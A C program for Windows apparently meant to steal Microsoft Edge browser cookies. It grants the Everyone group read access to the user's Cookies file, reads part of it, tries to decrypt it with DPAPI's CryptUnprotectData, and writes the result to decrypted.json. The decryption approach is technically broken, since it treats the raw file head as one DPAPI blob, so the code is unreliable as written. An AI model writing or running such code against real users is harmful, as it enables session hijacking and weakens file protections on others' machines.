#include <windows.h>
#include <wincrypt.h>
#include <aclapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function to decrypt data using Windows DPAPI
void decrypt_data(const BYTE *data, DWORD data_len, BYTE **decrypted_data, DWORD *decrypted_data_len) {
    DATA_BLOB encrypted_blob;
    DATA_BLOB decrypted_blob;

    encrypted_blob.pbData = (BYTE *)data;
    encrypted_blob.cbData = data_len;

    if (CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob)) {
        *decrypted_data = (BYTE *)malloc(decrypted_blob.cbData);
        memcpy(*decrypted_data, decrypted_blob.pbData, decrypted_blob.cbData);
        *decrypted_data_len = decrypted_blob.cbData;
        LocalFree(decrypted_blob.pbData);
    } else {
        printf("Decryption failed: %d\n", GetLastError());
    }
}

// Function to read the cookies file and extract encrypted data
void read_cookies_file(const char *path) {
    FILE *file = fopen(path, "rb");
    if (!file) {
        perror("Failed to open file");
        return;
    }

    // Example buffer to hold encrypted data (this should be read from the file)
    BYTE encrypted_data[256];
    DWORD encrypted_data_len = fread(encrypted_data, 1, sizeof(encrypted_data), file);
    fclose(file);

    if (encrypted_data_len > 0) {
        BYTE *decrypted_data = NULL;
        DWORD decrypted_data_len = 0;

        decrypt_data(encrypted_data, encrypted_data_len, &decrypted_data, &decrypted_data_len);

        if (decrypted_data) {
            // Write decrypted data to JSON file
            FILE *json_file = fopen("decrypted.json", "w");
            if (json_file) {
                fprintf(json_file, "{\n\t\"decrypted_data\": \"%.*s\"\n}\n", decrypted_data_len, decrypted_data);
                fclose(json_file);
                printf("Decrypted data written to decrypted.json\n");
            } else {
                perror("Failed to open JSON file");
            }
            free(decrypted_data);
        }
    } else {
        printf("No data read from file\n");
    }
}

// Function to set file permissions to allow read access
void set_file_permissions(const char *path) {
    DWORD result;
    PSID pEveryoneSID = NULL;
    PACL pACL = NULL;
    EXPLICIT_ACCESS ea;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

    // Create a well-known SID for the Everyone group.
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
                                  0, 0, 0, 0, 0, 0, 0, &pEveryoneSID)) {
        printf("AllocateAndInitializeSid Error %u\n", GetLastError());
        return;
    }

    // Initialize an EXPLICIT_ACCESS structure for an ACE.
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID;

    // Create a new ACL that contains the new ACEs.
    result = SetEntriesInAcl(1, &ea, NULL, &pACL);
    if (ERROR_SUCCESS != result) {
        printf("SetEntriesInAcl Error %u\n", GetLastError());
        if (pEveryoneSID) FreeSid(pEveryoneSID);
        return;
    }

    // Apply the new ACL as the object's DACL.
    result = SetNamedSecurityInfo((LPSTR)path, SE_FILE_OBJECT,
                                  DACL_SECURITY_INFORMATION,
                                  NULL, NULL, pACL, NULL);
    if (ERROR_SUCCESS != result) {
        printf("SetNamedSecurityInfo Error %u\n", GetLastError());
    }

    if (pEveryoneSID) FreeSid(pEveryoneSID);
    if (pACL) LocalFree(pACL);
}

int main() {
    char cookies_path[MAX_PATH];
    snprintf(cookies_path, sizeof(cookies_path), "%s\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", getenv("LOCALAPPDATA"));

    // Set file permissions to allow read access
    set_file_permissions(cookies_path);

    // Now attempt to read the file
    read_cookies_file(cookies_path);
    return 0;
}
